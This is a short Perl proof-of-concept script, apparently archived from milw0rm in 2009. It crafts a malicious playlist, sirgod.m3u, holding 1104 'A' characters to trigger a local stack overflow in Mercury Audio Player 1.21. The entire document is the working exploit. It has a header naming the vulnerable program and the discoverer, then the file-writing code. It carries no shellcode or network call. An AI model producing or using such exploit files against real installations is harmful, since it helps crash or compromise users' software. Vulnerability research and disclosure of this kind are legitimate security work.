###################################################################################
####      Mercury Audio Player 1.21 (.M3U File) Local Stack Overflow PoC      #####
####       Discovered by SirGod  -  www.mortal-team.net                       #####
###################################################################################
my $chars= "A" x 1104;
my $file="sirgod.m3u";
open(my $FILE, ">>$file") or die "Cannot open $file: $!";
print $FILE $chars;
close($FILE);
print "$file was created";

# milw0rm.com [2009-04-30]
